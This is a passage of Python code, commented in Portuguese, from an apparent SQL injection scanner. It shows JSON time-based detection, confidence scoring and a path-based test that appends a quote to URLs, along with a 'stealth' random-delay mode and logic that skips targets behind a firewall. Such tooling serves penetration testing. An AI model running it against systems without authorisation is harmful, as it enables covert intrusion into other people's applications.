                    elapsed = time.monotonic() - t0

                    triggered = (
                        (resp_t is None and elapsed >= threshold * 0.9)
                        or (resp_t is not None and elapsed >= threshold)
                    )

                    if triggered:
                        if resp_t and self._detect_waf(resp_t):
                            continue
                        result["vulnerable"] = True
                        result["tests"].append({
                            "method":    "json_time_based",
                            "parameter": key,
                            "evidence":  (
                                f"JSON time-based: elapsed={elapsed:.1f}s "
                                f"threshold={threshold:.1f}s"
                            ),
                        })
                        confidence_scores.append(2)
                        break

            if self.stealth:
                _interruptible_sleep(random.uniform(2, 4))

        if confidence_scores:
            best = max(confidence_scores)
            avg  = sum(confidence_scores) / len(confidence_scores)
            result["overall_confidence"] = (
                SQLiConfidence.HIGH.value   if best >= 3 else
                SQLiConfidence.MEDIUM.value if avg  >= 2 else
                SQLiConfidence.LOW.value
            )
            result["vulnerable"] = True

        result["message"] = "Teste de injeção JSON concluído"
        return result

    # ──────────────────────────────────────────────────────────
    #  Entry point baseado em path
    # ──────────────────────────────────────────────────────────

    def test_path_based_sqli(self, url: str) -> Dict:
        """Testa SQLi path-based anexando uma aspa a segmentos de path numéricos/palavra."""
        result = {
            "method":     "path_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
        }
        if self.circuit_breaker.is_dead(url):
            return result

        path = urlparse(url).path
        if re.search(r"/\d+$", path) or re.search(r"/\w+$", path):
            response = self._get(url + "'")
            if response:
                waf = self._detect_waf(response)
                if waf:
                    result["evidence"].append(f"WAF detectado ({waf}): path-based pulado")
                    return result

                match = self._match_sql_errors(response.text)
                if match:
                    db_type, pattern = match
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"Path-based SQLi: {db_type.upper()} — {pattern[:60]}"
                    )
        return result
